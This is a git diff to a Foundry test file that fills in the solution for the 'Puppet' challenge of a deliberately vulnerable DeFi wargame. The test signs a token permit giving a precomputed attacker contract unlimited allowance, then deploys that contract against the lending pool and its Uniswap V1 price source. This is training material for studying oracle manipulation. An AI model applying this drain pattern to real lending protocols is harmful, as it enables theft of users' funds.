@@ -2,7 +2,9 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "./Attacker.sol";
 import "../Util.sol";
+import "../SigUtils.sol";
 import "../../src/DamnValuableToken.sol";
 import "../../src/puppet/PuppetPool.sol";
 
@@ -16,6 +18,8 @@ interface UniswapV1Exchange {
 
     function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
 
+    function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline) external returns (uint256);
+
     function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
 }
 
@@ -27,10 +31,10 @@ interface UniswapV1Factory {
 
 contract PuppetTest is Test{
     Util util = new Util();
-
+    SigUtils sigUtil;
     address deployer = makeAddr('deployer');
-    address player = makeAddr('player');
-
+    address player;
+    uint256 playerSk;
     uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
     uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
 
@@ -47,10 +51,11 @@ contract PuppetTest is Test{
     PuppetPool lendingPool;
 
     function setUp() public{
+        (player, playerSk) = makeAddrAndKey('player');
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
         
         token = new DamnValuableToken();
-
+        sigUtil = new SigUtils(token.DOMAIN_SEPARATOR());
         uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));
         uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));
 
@@ -78,7 +83,19 @@ contract PuppetTest is Test{
 
     function testExploit() public {
         /*Code your solution here*/
-
+        address attackerContract = computeCreateAddress(address(player), 0);
+        SigUtils.Permit memory permit = SigUtils.Permit({
+            owner: address(player),
+            spender: address(attackerContract),
+            value: type(uint256).max,
+            nonce: 0,
+            deadline: type(uint256).max
+        });
+        bytes32 digest = sigUtil.getTypedDataHash(permit);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerSk, digest);
+        vm.startPrank(player);
+        new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(v, r, s, PLAYER_INITIAL_TOKEN_BALANCE, POOL_INITIAL_TOKEN_BALANCE, address(lendingPool), address(uniswapExchange), address(token));
+        vm.stopPrank();
         validation();
     }
 
